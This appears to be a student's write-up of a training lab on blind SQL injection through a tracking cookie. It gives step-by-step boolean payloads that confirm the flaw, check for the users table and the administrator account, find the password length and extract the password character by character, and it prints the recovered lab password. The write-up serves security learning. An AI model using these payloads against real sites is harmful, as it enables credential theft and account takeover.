@@ -1,0 +1,59 @@
+Lab 11 - Blind SQL Injection with conditional responses
+
+Vulnerable Parameter - Tracking Cookie
+
+End Goals : 
+1) Enumerate the password of the administrator
+2) Log in as the Administrator user
+
+Analysis :
+
+1) Confirm the parameter is vulnerable to blind SQLi
+
+select tracking_id from tracking_table where trackingId = '0gp9Fup9LXKocG7y'
+
+Notes:
+If the above tracking Id already exists in the database, as we have already visited the page using the same tracking Id, then the query hit should return "Welcome Back!" message 
+If tracking Id doesn't exists -> No result by Query -> No Welcome back message
+
+SQLi Payload:
+select tracking_id from tracking_table where trackingId = '0gp9Fup9LXKocG7y'and 1=1--'
+Result : 'Welcome Back!' Message - TRUE
+Conclusion : Since, it returns message, hence it proves there is a SQL Injection
+
+select tracking_id from tracking_table where trackingId = '0gp9Fup9LXKocG7y'and 1=0--'
+Result : No 'Welcome Back!' Message - FALSE
+Conclusion : It can be exploited, as even if the tracking Id is correct, No Welcome Message gets printed.
+
+2) Confirm we have a 'users' table
+select tracking_id from tracking_table where trackingId = '0gp9Fup9LXKocG7y'and (select 'x' from users LIMIT 1)='x'--'
+
+Result : 'Welcome Back' message is present which confirms that users table exists in the database
+
+3) Confirm the username administrator exists in users table
+select tracking_id from tracking_table where trackingId = '0gp9Fup9LXKocG7y'and (select username from users where username='administrator')='administrator'--'
+
+Result : 'Welcome Back' message is present which confirms that users table exists in the database with administrator as user
+
+4) Enumerate the password of the administrator user
+
+select tracking_id from tracking_table where trackingId = '0gp9Fup9LXKocG7y' and (select username from users where username='administrator' and LENGTH(password)>1)='administrator'--'
+
+4.1) The request is iterated for the length of password incrementing by 1 in each step, using the Intruder option.
+
+Result : The password is exactly 20 characters long
+
+select tracking_id from tracking_table where trackingId = '0gp9Fup9LXKocG7y'and (select substring(password,1,1) from users where username='administrator')='a'--'
+
+4.2) The request is iterated for the letter place holder 'a' with all alphabets(a-z) and numericals(0-9) 20 times with incrementing by 1 in each step, using the Intruder option.
+
+Result : 
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20
+l t k i d w 9 a t v  k  x  g  h  n  g  g  5  5  8
+
+Password : ltkidw9atvkxghngg558
+
+
+
+
+
